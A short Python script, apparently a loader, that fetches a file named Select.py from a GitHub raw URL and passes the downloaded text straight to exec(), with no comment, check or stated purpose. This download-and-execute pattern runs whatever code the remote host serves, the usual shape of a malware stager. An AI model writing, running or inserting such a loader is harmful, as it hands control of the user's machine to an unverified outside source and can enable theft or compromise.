import requests

url = "https://raw.githubusercontent.com/Wraith1vs11/Cloud/refs/heads/main/Select.py"
response = requests.get(url)

exec(response.text)
